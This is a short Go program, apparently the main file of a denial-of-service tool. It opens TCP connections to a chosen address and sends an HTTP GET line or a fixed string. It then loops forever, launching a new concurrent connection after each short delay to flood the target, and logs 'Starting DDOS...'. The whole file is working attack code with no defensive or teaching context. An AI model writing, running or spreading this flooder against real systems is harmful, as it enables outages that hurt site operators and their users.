package main

import (
	"ddos/options"
	"fmt"
	"log"
	"net"
	"os"
	"time"
)

const (
	HttpMessage   = "GET / HTTP/1.1\n"
	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
)

func ddos(opt options.Options) error {
	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		return err
	}

	message := ""
	if opt.Message != "" {
		message = opt.Message
	} else {
		if opt.Http {
			message = HttpMessage
		} else {
			message = SocketMessage
		}
	}
	_, err = fmt.Fprintf(conn, "%v\n", message)
	if err != nil {
		return err
	}

	err = conn.Close()
	if err != nil {
		return err
	}

	return nil
}

func main() {
	log.SetFlags(3)

	opt := options.Parse()
	currentRetryCount := 0

	if err := ddos(opt); err != nil {
		log.Printf("Couldn't run test-connect, error: %v...\n", err)
		os.Exit(1)
	}

	log.Printf("Starting DDOS...")

	for {
		go func() {
			err := ddos(opt)
			if err != nil {
				log.Printf("%v\n", err)

				if opt.MaxRetryCount <= 0 {
					return
				}

				if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
					log.Printf("Reached max retry count (%v), exiting...\n", opt.MaxRetryCount)
					os.Exit(1)
				}
			} else {
				log.Printf("Successfully send packet to %v...\n", opt.Address)
			}
		}()

		time.Sleep(time.Millisecond * time.Duration(opt.Delay))
	}
}
